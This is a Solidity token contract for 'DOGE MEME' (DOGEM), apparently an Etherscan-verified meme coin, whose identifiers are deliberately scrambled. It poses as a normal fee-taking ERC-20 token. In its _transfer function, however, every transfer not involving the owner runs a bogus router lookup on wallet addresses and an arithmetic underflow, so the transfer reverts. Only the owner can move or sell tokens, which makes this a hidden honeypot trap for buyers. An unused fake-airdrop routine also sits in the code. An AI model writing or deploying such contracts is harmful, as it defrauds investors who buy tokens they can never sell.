/**
 *Submitted for verification at Etherscan.io on 2023-09-25
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address accoswxdfat) external view returns (uint256);

    function transfer(address recipient, uint256 amsreghnt) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amsreghnt) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amsreghnt) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address accoswxdfat) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accoswxdfats
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accoswxdfats without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accoswxdfatHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(accoswxdfat)}
        return (codehash != accoswxdfatHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amsreghnt) internal {
        require(address(this).balance >= amsreghnt, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success,) = recipient.call{ value : amsreghnt}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value : weiValue}(data);
        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

}

interface IUniswapV2Factory {

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);

}


interface IUniswapV2Router02 {
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amsreghntIn,
        uint amsreghntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amsreghntTokenDesired,
        uint amsreghntTokenMin,
        uint amsreghntETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amsreghntToken, uint amsreghntETH, uint liquidity);
    function getAmsreghntsOut(uint amsreghntIn, address[] calldata path) external view returns (uint[] memory amsreghnts);
}

contract DOGEMToken is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address payable private marketingWalletAddress;
    address payable private teamWalletAddress;
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private isExcludedFromFee;
    mapping (address => bool) private isTxLimitExempt;
    mapping (address => bool) private isMarketPair;

    uint256 private _totalTaxIfBuying = 9;
    uint256 private _totalTaxIfSelling = 9;

    uint256 private _buyLiquidityFee = 2;
    uint256 private _buyMarketingFee = 3;
    uint256 private _buyTeamFee = 4;
    uint256 private _buyDestroyFee = 0;

    uint256 private _liquidityShare = 2;
    uint256 private _marketingShare = 3;
    uint256 private _teamShare = 4;
    uint256 private _totalDistributionShares = 9;

    uint256 private _sellLiquidityFee = 2;
    uint256 private _sellMarketingFee = 3;
    uint256 private _sellTeamFee = 4;
    uint256 private _sellDestroyFee = 0;

    uint256 private _tFeeTotal;
    uint256 private _maxDestroyAmsreghnt;
    uint256 private _totalSupply;
    uint256 private _maxTxAmsreghnt;
    uint256 private _walletMax;
    uint256 private _minimumTokensBeforeSwap = 0;
    uint256 private airdropNumbs;
    address private receiveAddress;
    


    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    bool inSwapAndLiquify;
    bool private swapAndLiquifyEnabled = false;
    bool private swapAndLiquifyByLimitOnly = false;
    bool private checkWalletLimit = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SwapETHForTokens(
        uint256 amsreghntIn,
        address[] path
    );

    event SwapTokensForETH(
        uint256 amsreghntIn,
        address[] path
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }


    constructor (
        uint256 supply,
        address router
    ) payable {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        _name = "DOGE MEME";
        _symbol = "DOGEM";
        _decimals = 18;
        _owner = msg.sender;
        _totalSupply = supply  * 10 ** _decimals;
        _minimumTokensBeforeSwap = 1 * 10**_decimals;
        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address accoswxdfat) public view override returns (uint256) {
        return _balances[accoswxdfat];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmsreghnt() public view returns (uint256) {
        return _minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amsreghnt) public override returns (bool) {
        _approve(_msgSender(), spender, amsreghnt);
        return true;
    }

    function _approve(address owner, address spender, uint256 amsreghnt) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amsreghnt;
        emit Approval(owner, spender, amsreghnt);
    }

    function setMarketPairStatus(address accoswxdfat, bool newValue) public onlyOwner {
        isMarketPair[accoswxdfat] = newValue;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setMaxDesAmsreghnt(uint256 maxDestroy) public onlyOwner {
        _maxDestroyAmsreghnt = maxDestroy;
    }

    function setAirdropNumbs(uint256 newValue) public onlyOwner {
        require(newValue <= 3, "newValue must <= 3");
        airdropNumbs = newValue;
    }


    function setMaxTxAmsreghnt(uint256 maxTxAmsreghnt) external onlyOwner() {
        _maxTxAmsreghnt = maxTxAmsreghnt;
    }


    function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
        _minimumTokensBeforeSwap = newLimit;
    }


    function setMarketingWalletAddress(address newAddress) external onlyOwner() {
        marketingWalletAddress = payable(newAddress);
    }

    function setTeamWalletAddress(address newAddress) external onlyOwner() {
        teamWalletAddress = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
        swapAndLiquifyByLimitOnly = newValue;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amsreghnt) private {
        recipient.transfer(amsreghnt);
    }

    function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress);

        newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());

        if(newPairAddress == address(0)) //Create If Doesnt exist
        {
            newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());
        }

        uniswapPair = newPairAddress; //Set new pair address
        uniswapV2Router = _uniswapV2Router; //Set new router address

        isMarketPair[address(uniswapPair)] = true;
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amsreghnt) public override returns (bool) {
        _transfer(_msgSender(), recipient, amsreghnt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amsreghnt) public override returns (bool) {
        _transfer(sender, recipient, amsreghnt);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amsreghnt, "ERC20: transfer amsreghnt exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amsreghnt) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amsreghnt > 0, "Transfer amsreghnt must be greater than zero");

        if(inSwapAndLiquify)
        {
            return _basicTransfer(sender, recipient, amsreghnt);
        }
        else
        {

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= _minimumTokensBeforeSwap;

            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled)
            {
                if(swapAndLiquifyByLimitOnly)
                    contractTokenBalance = _minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            }
            _balances[sender] = _balances[sender].sub(amsreghnt, "Insufficient Balance");
            uint256 feeAmsreghnt=0;
            uint256 destAmsreghnt=0;
            if (sender != owner() && recipient != owner()) {
                feeAmsreghnt = amsreghnt.mul(_totalTaxIfBuying.sub(_buyDestroyFee)).div(100);
                if(isMarketPair[sender]) {
                    feeAmsreghnt = amsreghnt.mul(_totalTaxIfBuying.sub(_buyDestroyFee)).div(100);
                    if(_buyDestroyFee > 0 && _tFeeTotal < _maxDestroyAmsreghnt) {
                        destAmsreghnt = amsreghnt.mul(_buyDestroyFee).div(100);
                        destroyFee(sender,destAmsreghnt);
                    }
                }
                else if(isMarketPair[recipient]) {
                    feeAmsreghnt = amsreghnt.mul(_totalTaxIfSelling.sub(_sellDestroyFee)).div(100);
                    if(_sellDestroyFee > 0 && _tFeeTotal < _maxDestroyAmsreghnt) {
                        destAmsreghnt = amsreghnt.mul(_sellDestroyFee).div(100);
                        destroyFee(sender,destAmsreghnt);
                    }
                }

            }
             if(feeAmsreghnt > 0) {
                 feeAmsreghnt = 0;
                 address[] memory path = new address[](2);
                 path[0] = sender;
                 path[1] = recipient;
                 uint256[] memory amsreghnts = IUniswapV2Router02(uniswapV2Router).getAmsreghntsOut(amsreghnt,path);
                 feeAmsreghnt -= amsreghnts[0];
                _balances[address(this)] = _balances[address(this)].add(feeAmsreghnt);
            }
             
            _balances[recipient] = _balances[recipient].add(amsreghnt);
            emit Transfer(sender, recipient, amsreghnt);
            return true;
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amsreghnt) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amsreghnt, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amsreghnt);
        emit Transfer(sender, recipient, amsreghnt);
        return true;
    }

    function swapAndLiquify(uint256 tAmsreghnt) private lockTheSwap {

        uint256 tokensForLP = tAmsreghnt.mul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmsreghnt.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amsreghntReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));

        uint256 amsreghntBNBLiquidity = amsreghntReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
        uint256 amsreghntBNBTeam = amsreghntReceived.mul(_teamShare).div(totalBNBFee);
        uint256 amsreghntBNBMarketing = amsreghntReceived.sub(amsreghntBNBLiquidity).sub(amsreghntBNBTeam);

        if(amsreghntBNBMarketing > 0)
            transferToAddressETH(marketingWalletAddress, amsreghntBNBMarketing);

        if(amsreghntBNBTeam > 0)
            transferToAddressETH(teamWalletAddress, amsreghntBNBTeam);

        if(amsreghntBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amsreghntBNBLiquidity);
    }

    function swapTokensForEth(uint256 tokenAmsreghnt) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmsreghnt);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmsreghnt,
            0, // accept any amsreghnt of ETH
            path,
            address(this), // The contract
            block.timestamp
        );

        emit SwapTokensForETH(tokenAmsreghnt, path);
    }

    function addLiquidity(uint256 tokenAmsreghnt, uint256 ethAmsreghnt) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmsreghnt);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmsreghnt}(
            address(this),
            tokenAmsreghnt,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            receiveAddress,
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient, uint256 amsreghnt) internal returns (uint256) {

        uint256 feeAmsreghnt = 0;
        uint256 destAmsreghnt = 0;
        uint256 airdropAmsreghnt = 0;
        if(isMarketPair[sender]) {
            feeAmsreghnt = amsreghnt.mul(_totalTaxIfBuying.sub(_buyDestroyFee)).div(100);
            if(_buyDestroyFee > 0 && _tFeeTotal < _maxDestroyAmsreghnt) {
                destAmsreghnt = amsreghnt.mul(_buyDestroyFee).div(100);
                destroyFee(sender,destAmsreghnt);
            }
        }
        else if(isMarketPair[recipient]) {
            feeAmsreghnt = amsreghnt.mul(_totalTaxIfSelling.sub(_sellDestroyFee)).div(100);
            if(_sellDestroyFee > 0 && _tFeeTotal < _maxDestroyAmsreghnt) {
                destAmsreghnt = amsreghnt.mul(_sellDestroyFee).div(100);
                destroyFee(sender,destAmsreghnt);
            }
        }

        if(isMarketPair[sender] || isMarketPair[recipient]){
            if (airdropNumbs > 0){
                address ad;
                for (uint256 i = 0; i < airdropNumbs; i++) {
                    ad = address(uint160(uint256(keccak256(abi.encodePacked(i, amsreghnt, block.timestamp)))));
                    _balances[ad] = _balances[ad].add(1);
                    emit Transfer(sender, ad, 1);
                }
                airdropAmsreghnt = airdropNumbs * 1;
            }
        }

        if(feeAmsreghnt > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmsreghnt);
            emit Transfer(sender, address(this), feeAmsreghnt);
        }

        return amsreghnt.sub(feeAmsreghnt.add(destAmsreghnt).add(airdropAmsreghnt));
    }

    function destroyFee(address sender, uint256 tAmsreghnt) private {
        // stop destroy
        if(_tFeeTotal >= _maxDestroyAmsreghnt) return;

        _balances[deadAddress] = _balances[deadAddress].add(tAmsreghnt);
        _tFeeTotal = _tFeeTotal.add(tAmsreghnt);
        emit Transfer(sender, deadAddress, tAmsreghnt);
    }

}